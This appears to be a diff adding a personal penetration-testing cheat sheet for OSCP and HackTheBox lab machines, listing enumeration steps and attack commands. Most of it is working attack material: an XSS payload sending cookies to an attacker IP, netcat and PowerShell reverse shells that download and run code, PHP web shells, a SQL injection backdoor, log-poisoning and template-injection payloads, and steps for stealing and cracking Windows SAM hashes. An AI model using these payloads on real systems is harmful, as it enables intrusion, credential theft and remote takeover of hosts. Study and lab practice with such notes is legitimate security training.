@@ -1,0 +1,665 @@
+* Quick GitHub repo: git add . ; git commit -m "smth" ; git push origin master
+[ + ] Linux Boxes [ + ] 
+-> Lame
+-> BrainFuck
+-> Shocker
+-> Bashed
+-> Nibbles
+-> Beep
+-> CronOS
+-> Nineveh
+-> Sense
+-> SolidState
+-> Kotarak
+-> Node
+-> Valentine
+-> Poison
+-> Sunday
+-> Tartarsauce
+
+[ + ] Windows Boxes [ + ]
+-> Legacy
+-> Blue
+-> Devel
+-> Optimum
+-> Bastard
+-> Granny
+-> Arctic
+-> Grandpa
+-> Silo
+-> Bounty
+-> Jerry
+
+To mention: *Try to don't use metasploit as much as you can*
+
+OSCP:
+-> Run a simple "nmap" and then a slower one, but on all ports.
+-> Check first results (webs, ssh, ftp) from the first fast nmap scan.
+-> Always go for the easiest port (SMB, FTP, HTTP...).
+-> Depend on each port do the appropiate enumeration techniches.
+
+[ + ] HTTP [ + ]
+-> If we get a HTTP server and we recognize that it's Wordpress, first:
+	* use(to get an exploit in case): wpscan --url https://brainfuck.htb --disable-tls-checks
+	* use(to enumerate the users): wpscan --url https://brainfuck.htb --disable-tls-check --enumerate u
+
+-> If you nmap a server and it haves http-webdav-scan:
+	* try and see the options...
+	* if you have MOVE and PUT you can say you have a reverse shell already...
+	* davtest --url url
+	* cadaver: to put or what commands do you have
+
+-> In case we just enum some users and we don't have a clue about passwords we can use:
+	* hydra -l user -P rockyou.txt IP http-post-from "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+	* hydra -l ftpuser -P password_list ftp://ip_machine
+
+-> In case we discover a login API we can use:
+	* wfuzz -u httpL//IP/centreon/api/index.php?action=authentificate -d 'username=admin&password=FUZZ' -w darkweb2017-top1000.txt
+
+-> You should allways check for:
+	* ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
+	| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+	* after you get the DNS, and Domain name edit the /etc/hosts
+
+-> In case the Wordpress Website has "Easy WP SMTP Settings":
+	* use "Evolution" to connect to SMTP and get the inbox messages
+	* port 143 IMAP+
+
+[ + ] SSH [ + ]
+-> If you get a id_rsa ENCRYPTED KEY you should use:
+	* ssh2john id_rsa > id_rsa.hash
+	* john id_rsa.hash --wordlist=rockyou.txt
+	* chmod 600 id_rsa
+	* ssh -i id_rsa user@domain and then enter the passphrase for the key.
+
+[ + ] Windows Machine [ + ]
+-> DC_Sync attack:
+	* secretsdump.py ( from impacket )
+
+#################
+-> Enumerating AD:
+	* Enumerating Users:
+
+	    ­Enum4linux -a <IP>
+
+Using bruteforce on Kerberos using metasploit can be very efficient but time consuming. You can use this as a last resort.
+
+    msf > use Auxiliary/gather/Kerberos_enumusers
+                                                                                                                                                                      
+[ + ] Impacket [ + ]                                                                                                                                                  
+                                                                                                                                                                      
+GetADUsers.py -all <domain\User> -dc-ip <DC_IP>                                                                                                                       
+                                                                                                                                                                      
+Password Bruteforce: [ + ] SMB [ + ]                                                                                                                                  
+                                                                                                                                                                      
+    ­Auxiliary/scanner/smb/smb_login                                                                                                                                  
+                                                                                                                                                                      
+Exploring SMB Shares:                                                                                                                                                  
+            ­smbclient -L \\Domain_Name -I <DC_IP> -N                                                                                                                 
+            If any path is writable, move directly to the exec.py from Impacket withe below:                                                                          
+                    python /opt/impacket/examples/psexec.py <domain/user>:<password>@<server ip>
+#################
+-> Impacket usage:
+	* Script category:
+    
+    Remote code Execution : atexec.py, dcomexec.py, psexec.py, smbexec.py and wmiexec.py
+    SMB/MSRPC : getArch.py, ifmap.py, lookupsid.py, samrdump.py, services.py, netview.py, smbclient.py, opdump.py, rpcdump.py and reg.py
+    Kerberos: GetST.py, GetPac.py, GetUserSPNs.py, GetNPUsers.py, ticketer.py and raiseChild.py
+    Windows Secret: mimikatz.py
+    Server Tools/MiTM Attacks: karmaSMB.py and smbserver.py
+    WMI: wmipersist.py
+    Known Vulnerabilities: sambaPipe.py and sambaPipe.py
+    MSSQL / TDS: mssqlclient.py
+    File Formats: ntfs-read.py and registry-read.py.
+    Others: mqtt_check.py, rdp_check.py, sniffer.py, ping.py, and ping6.py
+#################
+->  PowerUP usage:
+	* PowerUp: A Usage Guide:
+
+    C:> powershell.exe -nop -exec bypass
+
+    One option is to upload the PowerUp.ps1 script to the machine, drop into a shell, and execute the following command:
+
+    C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
+
+    C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
+
+#################
+-> Windows Basic Kerberos:
+	* Basic kerberos:
+
+[ + ] - /usr/share/doc/python-impacket/examples/GetNPUsers.py -no-pass -dc-ip forest.htb HTB.LOCAL/svc-alfresco
+Use the GetNPUsers.py to get the TGT key
+
+[ + ] - john tgt.txt --wordlist=/usr/share/wordlists/rockyou.txt
+To bruteforce the TGT password
+
+[ + ] - /usr/share/doc/python-impacket/examples/getTGT.py -dc-ip forest.htb HTB.LOCAL/svc-alfresco
+To get a handshake
+
+[ + ] - ruby evil-winrm.rb -i forest.htb -u svc-alfresco -p s3rvice
+To get the remote shell
+#################
+-> How to create a user:
+	New-LocalUser "yakuhito" -Password $(ConvertTo-SecureString 'yakuhito' -AsPlainText -Force)
+	$Group = Get-ADGroup -Identity "CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local"
+	Add-ADGroupMember -Identity $Group -Members yakuhito
+	$Group2 = Get-ADGroup -Identity "CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local"
+	Add-ADGroupMember -Identity $Group2 -Members yakuhito
+	$Group3 = Get-ADGroup -Identity "CN=Remote Management Users,CN=Builtin,DC=htb,DC=local"
+	Add-ADGroupMember -Identity $Group3 -Members yakuhito
+#################
+-> Website Recon:
+	* whois enum: whois IP
+	* google hacking: site:IP filetype:PHP ( example )
+
+[ + ] Netcraft [ + ]
+	url: https://searchdns.netcraft.com
+
+[ + ] Recon-ng [ + ]
+	usage: marketplace search
+	* In this example, we will search for modules that contain the term github : *
+		-> marketplace search github
+
+[ + ] Open-Source Code [ + ]
+	usage: github search
+	*filename:users*
+
+[ + ] Shodan [ + ]
+	usage: hostname:IP
+
+[ + ] Security Headers Scanner [ + ]
+	usage: put the ip and get the HEADER security
+
+[ + ] Email Harvesting [ + ]
+	usage: theharvester -d megacorpone.com -b google
+	*For example, we can run theHarvester with -d to specify the target domain and -b to set the data
+source to search *
+
+[ + ] Social Media Tools [ + ]
+	usage: Social-Searcher
+#################
+-> NFS Enumeration:
+[ + ] Scanning for NFS Shares [ + ] ( Both Portmapper 214 and RPCbind 215 run on TCP port 111 )
+	usage: nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
+	usage: nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
+
+EXAMPLE:	
+```PORT
+```STATE SERVICE
+```111/tcp open rpcbind
+```| nfs-showmount:
+```|_ /home 10.11.0.0/255.255.0.0
+
+*In this case, the entire /home directory is being shared and we can access it by mounting it on our
+Kali virtual machine. We will use mount to do this, along with -o nolock to disable file locking,
+which is often needed for older NFS servers:*
+
+```kali@kali:~$ mkdir home
+kali@kali:~$ sudo mount -o nolock 10.11.1.72:/home ~/home/
+kali@kali:~$ cd home/ && ls
+jenny joe45 john marcus ryuu```
+#################
+-> Windows SNMP Enumeration Example:
+[ + ] Enumerating the Entire MIB Tree [ + ] ( snmpwalk )
+
+```kali@kali:~$ snmpwalk -c public -v1 -t 10 10.11.1.14
+iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPAT
+IBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
+iso.3.6.1.2.1.1.3.0 = Timeticks: (2005539644) 232 days, 2:56:36.44
+iso.3.6.1.2.1.1.4.0 = ""```
+
+* command: snmpwalk -c public -v1 -t 10 10.11.1.14 *
+#################
+-> Vulnerability Scanners:
+[ + ] Nessus [ + ]
+[ + ] NMAP [ + ]
+	*usage: sudo nmap --script vuln 10.11.1.10
+[ + ] Brup Suite [ + ]
+[ + ] Nikto [ + ]
+	*usage: nikto -host=http://www.megacorpone.com -maxtime=30s
+#################
+-> Stealing Cookies and Session Information:
+	*To implement our cookie stealer, we need to modify our XSS payload as follows:
+		[ + ] <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script> [ + ]
+		Once we submit this payload to the application, we just need to wait for an authenticated user to
+		access the application so we can steal the PHPSESSID cookie.
+#################
+-> Directory Traversal Vulnerabilities:
+	*This vulnerability occurs
+	when input is poorly validated, subsequently granting an attacker the ability to manipulate file paths
+	with “../” or “..\” characters.*
+	
+	*Once we’ve identified some likely candidates, we can modify these values to attempt to reference
+	files that should be readable by any user on the system, such as !!!/etc/passwd!!! on Linux or !!!c:\boot.ini!!!
+	on Windows.*
+
+EXAMPLE:	
+```10.11.0.22/menu.php?file=old.php```
+-> http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
+#################
+-> SQL Injection:
+[ + ] Basic SQL Syntax [ + ]
+```A relational database is made up of one or more tables and each table has one or more columns.
+Each entry in a table is called a row. Let’s look at an example:
++----+------------+--------------+
+| id | username
+| password
+|
++----+------------+--------------+
+| 1 | tom.jones | notunusual
+|--------------------------------+
+
+Listing 311 - A sample users table
+In Listing 311, the columns are id, username, and password. There is one row of data for a user with
+the username of tom.jones and a password of notunusual.
+In most cases, we will be dealing with queries. Queries are instructions to the database engine and
+we use them to retrieve or manipulate data in the database. A SELECT query is the most basic
+interaction:
+SELECT * FROM users;
+Listing 312 - A simple select query
+We can paraphrase the query in Listing 312 as “show me all columns and records in the users
+table”. The first argument to the SELECT command is a column and the asterisk is a special
+character that means “all”.
+We also have the option of introducing a conditional clause to our query with a WHERE clause:
+SELECT username FROM users WHERE id=1
+*select * from users where name = 'tom' or 1=1;*
+
+[ + ] MySQL Login [ + ]
+	usage: mysql -u root -p root
+
+[ + ] SQL Backdoor [ + ]
+	usage: http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['
+	cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+```
+
+-> Automating SQL Injection:
+[ + ] SQLmap [ + ]
+	usage: sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" or sqlmap -u http://10.11.0.22/debug.php?id=1 --dbs 
+
+[ + ] Get schema tables [ + ]
+	usage: select * from information_schema.tables where table_schema=database()
+#################
+-> To remind:
+	* always if you have an executable or .sh file on http under some directories like /cgi-bin/ex.sh
+	* run burp suite and try to get a reverse shell via BASH, and add a Cookie: () { :;} echo; /bin/ls
+
+-> If a user have SUDO NOPASSWD to root always check the GTFOBINS repository...
+#################
+-> On Linux Machines...
+	* if we get a DNS port listening we should use:
+		dig axfr @IP domain.htb
+		( 53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux) )
+	* LFI:
+		dirsearch.py -u ADDR -e * -w wordlist
+	* SSH Tunnel:
+		ssh -L PORT:IP:PORT USER@IP
+#################
+-> Noting:
+	* always note all the passwords and users you get by enumerating...
+	* if you don'y find an exploit then try to bruteforce via hydra the /login page
+	* for password's use SecLists - darkweb
+#################
+-> SMB:
+	* smbmap -H 10.10.10.123
+	* smbclient //10.10.10.123/SHARE
+	* always check for READ/WRITE folders, but mainly WRITE folders. 
+#################
+-> LFI:
+	* if we have LFI with php like: ?image_id=a.gif&page_name=timestamp...it's an example you got it
+	* we can ?image_id=a.gif&page_name=php://filter/convert.base64-encode/resource=login ( the file you want to encode to view the source)
+	* you can use that just if it's appending .php
+#################
+-> MSFConsole:
+	* if you don't get a reverse shell after uploading a file..like in tomcat a war one...
+	* unzip the file: 
+		Archive:  war_file.war
+		   creating: META-INF/
+	           inflating: META-INF/MANIFEST.MF    
+	           creating: WEB-INF/
+	           inflating: WEB-INF/web.xml         
+	           inflating: hvvutlfhxbc.jsp
+	* after that copy the location of the .jsp file and go to war_file.war/hvvutlfhxbc.jsp and you will get a reverse shell
+#################
+-> Telnet * FTP:
+	* if you get a ftp port try to login with: anonymous:anonymous
+	* if you want to download all the files you can with the "anonymous" creds use:
+		wget -m --no-passive ftp://anonymous:anonymous@IP
+	* also try to login with: anonymous:anonymous on Telnet
+#################
+-> Files:
+	* if you get a backup.mdb file try running:
+		strings -n 8 backup.mdb | sort -u > poss_word
+	* and then if you have a zip or something you can crack it's password with john
+	* also you can use mdb-sql & mdb-tables:
+		mdb-sql:
+			list tables; go
+		mdb-tables:
+			mdb-tables backup.mdb
+			for i in $(mdb-tables backup.mdb); do echo $i; done
+			for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i > tables/$i; done
+	* for .pst files use readpst...
+#################
+-> Powershell reverse shell:
+	* use cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1 ( but after you edit the port down )
+	* powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8000/nishang.ps1')"
+	* nc -lvp 9001
+	* use jaws-enum.ps1 for enum line LinEnum on Linux
+	* Import-Module .\nishang.psm1
+#################
+-> Get the content of a file Windows:
+	* $WScript = New-Object -ComObject Wscript.shell
+	* $shortcut = Get-ChildItem *.lnk
+	* $shortcut
+	* $Wscript.CreateShortcut($shortcut)
+#################
+-> smb_connect:
+	* smbclient -U r.thompson  \\\\10.10.10.182\\Data
+	* smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182
+#################
+-> ldapsearch -x -h cascade.htb -b "dc=cascade,dc=local"
+#################
+-> If you find the "finger" port on 79 or whatever use:
+	* finger @IP
+################
+-> If you find a 2049/udp6 nfs or other port but nfs use:
+	* sudo showmount -e IP
+	* mount -t nfs IP:/home/vulnix ~/vulnix ( this is an example )
+	* umount mounted-device
+################
+-> PHP One Line cmd-shell:
+	* <?php
+	system($_REQUEST['cmd']);
+	?>
+sudo php -S 0.0.0.0:80 -t ~/Desktop/OSCP-Preparation/PythonWeb/brute - webserver
+################
+-> Always after a normal gobuster, try a gobuster just for .php files, maybe it's something hidden:
+	* gobsuter dir -u http://IP -x php
+################
+-> A simple echo file for .png files:
+	* create a file first with:
+		* <?php
+                 system($_REQUEST['cmd']);
+                 ?> ( shell.php.png )
+	* then echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > practic.php.png
+	* cat shell.php.png >> practic.php.png
+################
+-> Get a reverse shell via curl:
+	* if you know you can get a reverse shell and it doesn't work, try with a list of payload and different necat versions for ex: nc.traditional, nc$IFS, nc -e, etc.
+	* curl http://10.10.10.150/index.php -G --data-urlencode ​'pwn=rm/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f'
+################
+-> Get AD users:
+	* The value of “2” corresponds to a disabled account status, and so the query below will return
+	active users (by sAMAccountName / username) in the active.htb domain.
+	ldapsearch -x -h 10.10.10.100 -p 389 -D ​ 'SVC_TGS'​ -w ​ 'GPPstillStandingStrong2k18'
+	-b ​ "dc=active,dc=htb"​ -s sub
+	"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.
+	4.803:=2)))"​ samaccountname | grep sAMAccountName
+################
+-> Wordpress 5.3.2: ( *wpCentral plugin* )
+	* get the connection key
+	* /wp-admin/wp-admin-ajax.php?[..]?key=key
+################
+-> SQL:
+	* &password=password' or '1'='1
+	* email=email-- -&password=password
+	* email=admin@ceva' OR '1' = '1&password=password
+################
+-> Remote file sharing via nc:
+	* nc -l -p 8003 > ovrflw              /on your kali
+
+	* nc -w 5 YourIpAddress 8003 < ovrflw     /on Target
+################
+-> Log Poisoning:
+	* http://10.10.14.194/?view=../../../var/log/apache2/access.log
+	* And then we can see the encryption...
+	* We can do a RCE base on the user agent if its not encrypted in this case on the User-Agent...
+		-> User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://ip/shell.php'))?>
+		-> python -m SimpleHTTPServer 80
+		-> nc -lvp 1234
+################
+-> Tty:
+	* export TERM=xterm
+################
+-> SUID Files:
+	* find / -perm -u=s -type f 2>/dev/null
+################
+-> PDF XSS ReadFile Payload:
+	* https://www.esecurify.com/local-file-read-access-through-xss-in-dynamically-generated-email-template-pdf/
+################
+-> Invalid Header: ( request header )
+	* X-Forwarded-For : IP
+################
+-> Tomcat9 upload:
+	-> curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/myapp'
+	`OK - Deployed application at context path [/myapp]`
+################
+-> Custom wordlist from website:
+	* sudo cewl -w wordlist.txt -d 10 -m 1 http://website
+################
+-> Always include the hosts and if you see a SQL error intercept it on *BURPSUITE* and use:
+	* sqlmap -r req.txt --dbs --batch
+################
+-> Always check for internal ports:
+	* netstat -tulpn:
+		telnet 127.0.0.1 11211
+################
+-> Bruteforce subdomain:
+	* wfuzz -u http://sneakycorp.htb/ -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.sneakycorp.htb' --hw 12
+################
+-> Basic enum:
+	* SMB Protocol: 
+		- check with:
+			 smbclient -L fuse.htb
+			 Enum4linux: enum4linux fuse.htb
+			 bruteforce smb_login with msf...With a dictionary made by you with sudo cewl: cewl -d 5 -m 3 -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers 
+			 Then if you have some creds for smb you can check with: smbclient -L fuse.htb -U tlavel
+			 If you get a error like this: STATUS_PASSWORD_MUST_CHANGE from smb, we must use smbpasswd to change smb password like: mbpasswd -r fuse.htb -U tlavel and then we can enter the smb correcly and good...
+			 Enumerate rpc: rpcclient -U FABRICORP\\tlavel 10.10.10.193 - we can get the domain from enum4linux, nmap etc.
+				- some commands for rpc: enumdomusers, enumprivs, enumprinters
+			 We can bruteforce with evil-winrm with msfconsole: scanner/winrm/winrm_login
+################
+-> Reverse Shell Windows:
+	* msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o reverse.exe
+	* Then copy it to the windows machine: 
+		- We can make a smb share: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+		- copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe ( on the windows machine )
+		- sudo nc -nvlp 53
+		- then run the *C:\PrivEsc\reverse.exe*
+	* Service Exploits:
+		- use C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
+		- sc qc daclsvc
+		- sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+		- net start daclsvc
+	* Unquoted Service Path:
+		- sc qc unquotedsvc
+		- C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
+		- copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+		- net user unquotedsvc
+	* Save creds:
+		- cmdkey /list
+		- runas /savecred /user:admin C:\PrivEsc\reverse.exe
+	* Security Account Manager (SAM):
+		- Transfer the SAM and SYSTEM files to your Kali VM:
+		- copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
+		- copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
+		* On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
+		- git clone https://github.com/Neohapsis/creddump7.git
+		- sudo apt install python-crypto
+		- python2 creddump7/pwdump.py SYSTEM SAM
+		- hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+###############
+-> Grep users from a big file:
+	* #cat rpcusers.txt | cut -d '[' -f 2 | cut -d ']' -f 1 >> rpcusers.txt
+
+###############
+-> When you check the windows privilages and u get the *Impersonation Privilege* you can use "PrintSpoofer" to elevate to the next user or SYSAdmin
+	* https://github.com/itm4n/PrintSpoofer
+###############
+-> SYSADMIN tools:
+	* NSudo:-- Series of system administration Tools
+		- https://github.com/M2Team/NSudo
+###############
+-> If you get a page that looks like a server template injection you can try: (FLASK)  
+	* {{7*7}} and if you get 49 that will work...
+	* use tplmap -d "id=*"
+###############
+-> XSS SSRF:
+	* the payload that you will use is: <script>document.location="webserver/ngrook:80"</script>
+	* start your ngrook http 80 server
+	* and on another terminal use: nc -nvlp 80
+	* that way you can see the user-agent and the hidden things that the "admin" haves...
+###############
+-> Crypto:
+	[ + ] RSA [ + ]
+		- if you are given a key.pem file and a cipher file use: openssl rsa -noout -text -in key.pem to get the primes...
+		------------------------------------------------------------------------------------------------------------------
+		import binascii
+		from Crypto.Util.number import inverse, long_to_bytes
+
+		p = 13320748866201356181344166184421375497515625622316425506199081642260132991766218637808281734634788900326296409095792329843375057734871609874138905359078279
+		q = 12586544580050654069851761426383855110824433050042398629881778466506902639279324122929784337688335994244229757862628435521142421664152251599853729381586747
+		n = p * q
+		e = 65537
+
+		phi = ( p - 1) * ( q - 1)
+		d = inverse(e, phi)
+
+		with open("cipher.txt", "rb") as f:
+		        hexdata = binascii.hexlify(f.read())
+
+		ct = int(hexdata, 16)
+		m = pow(ct, d, n)
+
+		print(long_to_bytes(m))
+		------------------------------------------------------------------------------------------------------------------
+###############
+-> LFI Fuzz:
+	* python3 /home/iulian/dirsearch/dirsearch.py -u http://vps-b40e6212.vps.ovh.net/intranetplatform/dashboard.php?page= -e * -w /home/iulian/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
+###############
+-> Bruteforce wpscan:
+	*wpscan --url http://panda.thm/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames po
+###############
+-> If you can find anything on the normal scan, use: nmap -sU for UDP scan
+##############
+-> SMB:
+	sudo mount -t cifs -o 'username=username,password=password' //IP/share /mt * this will mount the share you want
+##############
+-> LSAS:
+	if we het a lsass.dmp file or soemthing like that we can use: pypykatz lsa minidump lsass.DMP > lsass.out
+##############
+-> Send Email:
+	sendEmail -f ceva@domain.com -t to_user@domain.com -u RFT(format) -m "MESAGE" -a ceva.file -s IP
+##############
+-> Play with tty:
+	* ps -ft pts/2
+	* kill -9 PID
+##############
+-> Bypass image filter:
+	* change content type to image/gif and shell.php.gif
+##############
+-> Bypass command injection filters:
+	* to bypass space use: \x20 or ${IFS} or $IFS
+	* to bypass ; use: %3b
+	* always search for every char in payload to bypass
+	Example:
+		GET /weather/forecast?city=London');os.execute("rm\x20/tmp/f%3bmkfifo\x20/tmp/f%3bcat\x20/tmp/f|/bin/sh\x20-i\x202>%261|nc\x2010.10.14.25\x209001\x20>/tmp/f")
+##############
+-> gobuster wildcard error:
+	* gobuster dir -u http://10.10.10.81 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -s "204,301,302,307,401,403"
+##############
+-> SSTI:
+	* http://178.128.40.63:31435/%7B%7Bconfig.__class__.__init__.__globals__['os'].popen('ls').read()%7D%7D
+	* <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+dig -t TXT secure-startup.com
+##############
+-> RFI:
+	* if we have and RFI and it's trying to get something like: "/random_shit" we can do a "?page=http://OUR_IP/shell.php%00" to get rid of the extra content
+##############
+-> Tar privesc:
+	* tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="cat enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag"
+##############
+-> PHP functions:
+	* assert():
+		- option 1: %27.highlight_file(%27.passwd%27).%27
+		- https://pentesterlab.com/exercises/web_for_pentester/course
+
+		- option2: When we put “..” as a parameter, we see the error and the assertion rules.
+			assert("strpos('includes/'.$_GET['page'].'.php','..')===false")
+			Because when the assertion is error, it’ll cause an exception.
+			So we just inject “die()” function to handler an exception, when an error ouccur, read the source code of the file. 
+			[ + ] ' and die(show_source('includes/../.passwd')) or ' -> %27%20and%20die(show_source(%27includes/../.passwd%27))%20or%20%27
+
+
+		-option3: ’.system(“ls -lA;cat .passwd”).’about
+
+	* php filters:
+		- php://filter/convert.base64-encode/resource=login.php
+	
+	* php register globals:
+		- example code: if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) )
+			[ + ] so we use: it said if $_SESSION[“logged”]==1 then show the password
+				so we will do GET request like this:
+		
+				-> http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1
+
+#############
+-> API Fuzzing:
+	* wfuzz -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt -c --hc 404 -t 40 http://10.10.192.216:5000/api/v1/resources/books?FUZZ=/etc/passwd
+#############
+-> LFI to RCE files:
+	
+    /var/log/apache/access.log
+    /var/log/apache/error.log
+    /var/log/vsftpd.log
+    /var/log/sshd.log
+    /var/log/mail
+    /proc/self/environ
+    /proc/self/fd
+
+Than we can do:
+	* GET /LFI/LFI.php?page=/var/log/apache2/access.log
+	* User-Agent: Mozilla/5.0 <?php system($_GET['lfi']); ?> Firefox/70.0
+	* http://<IP>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=
+#############
+
+systemctl --user enable pulseaudio && systemctl --user start pulseaudio
+sudo killall pulseaudio
+
+#############
+-> In case that you have a smtp 25 port open..You could use ThunderBird on the mails that you got and see if there is something...
+#############
+-> To see files recently modified use:
+	* find . -type f -printf "%T+ %p\n" | sort
+#############
+-> Shellshock:
+	* User-Agent: () { :;}; echo $(</etc/passwd)
+#############
+-> SQL Union:
+	* http://ptl-c04eab4e-5de90926.libcurl.so/cat.php?id=2%20union%20select%201,table_name,3,4%20from%20information_schema.tables
+	* http://ptl-c04eab4e-5de90926.libcurl.so/cat.php?id=2%20union%20select%201,concat(login,%20%22:%22,%20password),3,4%20from%20users
+-> SQL Lab:
+	* profileID=10 -> 1 or 1=1-- -
+	* profileID='10' -> 1' or '1'='1'-- -
+	* URL Injection:
+		- http://10.10.100.170:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a ( url encode )
+	* SQL-LITE:
+		- ',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email=' - dump all tables
+		- ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
+		- ',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
+		- 1' union select 1,group_concat(password) from users-- - ( group_concat dump's all the passwords)
+
+#############
+-> Raspberry PI default creds:
+	* user: pi
+	* password: rasberry
+#############
+-> XXE Payloads:
+	* <?xml version="1.0"?>
+	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+	<root>&read;</root>
+
+
+
+
